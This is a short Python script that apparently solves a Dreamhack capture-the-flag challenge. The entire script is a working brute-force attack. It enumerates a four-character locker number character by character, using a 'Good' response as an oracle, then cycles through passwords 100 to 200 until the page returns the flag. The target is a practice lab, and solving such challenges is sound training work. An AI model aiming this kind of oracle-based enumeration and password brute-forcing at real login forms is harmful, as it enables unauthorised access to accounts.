import requests
import string
URL = "http://host3.dreamhack.games:19599/"
char = string.ascii_lowercase + string.digits
pre = ""

for pos in range(4):
    for c in char:
        test = pre + c
        r = requests.post(URL, data = {
            "locker_num" : test,
            "password" : "0"
        })

        if "Good" in r.text:
            pre = test
            print("Find : ", pre)
            break

for pw in range(100, 201) :
    r = requests.post(URL, data = {
        "locker_num" : pre,
        "password" : str(pw)
    })

    if "FLAG:" in r.text:
        print(r.text)
        break